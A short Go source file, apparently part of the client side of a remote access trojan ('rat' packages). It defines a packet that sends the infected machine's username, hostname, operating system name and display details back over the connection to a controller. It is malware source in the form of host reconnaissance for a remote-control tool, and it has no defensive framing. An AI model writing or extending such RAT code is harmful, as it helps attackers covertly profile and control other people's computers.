package main

import (
	"oslib"
	"rat/client/computer"
	"rat/common"
)

type ComputerInfoPacket struct {
	OutgoingPacket
}

func (packet ComputerInfoPacket) GetHeader() common.PacketHeader {
	return common.ComputerInfoHeader
}

func (packet ComputerInfoPacket) Write(c *Connection) error {
	u := userinfo.GetComputerInformation()

	c.WriteString(u.Username)
	c.WriteString(u.Hostname)
	c.WriteString(oslib.Name)
	c.WriteString(oslib.GetDisplay())

	return nil
}
